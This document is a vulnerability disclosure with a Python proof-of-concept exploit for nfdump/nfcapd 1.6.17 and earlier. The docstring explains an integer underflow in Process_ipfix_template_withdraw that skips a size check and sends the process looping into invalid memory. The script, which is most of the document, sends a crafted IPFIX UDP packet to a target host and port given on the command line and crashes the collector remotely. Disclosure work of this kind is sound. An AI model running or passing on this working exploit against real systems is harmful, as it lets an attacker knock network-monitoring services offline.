'''
Product: nfdump 1.6.17 and below
Discovered by:  Juan Manuel Fernandez (@TheXC3LL)
Description:
 An integer overflow at function Process_ipfix_template_withdraw that can be abused in order to crash the process remotely (denial of service).
 
 
 The function uses size_left as uint32_t which is an unsigned integer, so if we have a size_left with value 1, when the substraction at line 1429 is done (size_left -= 4;), it will overflow and become 4294967293 (0xfffffffd). As this is a value higher than "4", the size check made at line 1443 (if ( size_left < 4 ){(...) size_left = 0; (...)}) will be bypassed. At this point we have a huge loop (while ( size_left )) where the pointer DataPtr will be increased by 4 in each iteration until it reaches an invalid memory address and segfaults.
 '''
 
import socket
import sys

packet = [
0x00, 0x0a, 0xc8, 0xc9, 0x00, 0x00, 0x0a, 0x20,
0x00, 0x5d, 0x53, 0x64, 0x02, 0x00, 0x00, 0x03,
0x00, 0x02, 0x00, 0x05, 0x11, 0x00
]


exploit = ""
for x in packet:
    exploit += chr(x)

print "[*] Nfcapd DoS - Integer Overflow at Process_ipfix_template_withdraw()"
print "[*] Rocket to: %s:%s" % (sys.argv[1], sys.argv[2])


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(exploit, (sys.argv[1], int(sys.argv[2])))
 
